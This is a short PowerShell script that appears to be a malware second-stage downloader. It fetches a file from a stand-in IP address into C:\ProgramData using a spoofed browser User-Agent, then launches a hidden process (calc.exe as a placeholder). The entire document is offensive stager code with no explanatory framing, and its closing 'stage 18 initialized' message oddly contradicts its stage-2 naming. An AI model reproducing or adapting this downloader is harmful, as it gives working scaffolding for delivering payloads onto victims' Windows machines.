
[CmdletBinding()]
param(
    [string]$Stage2Url = "https://203.0.113.84/stage2.ps1",
    [string]$DownloadPath = 'C:\ProgramData\payload.bin',
    [int]$TransferTimeout = 122,
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$OperationResult = Get-Stage2Payload -SourceUrl $Stage2Url -DestinationPath $DownloadPath -TimeoutSec $TransferTimeout -UserAgent $RequestAgent
if ($OperationResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}

Write-Output "stage 18 initialized"
Set-Location -Path $env:TEMP
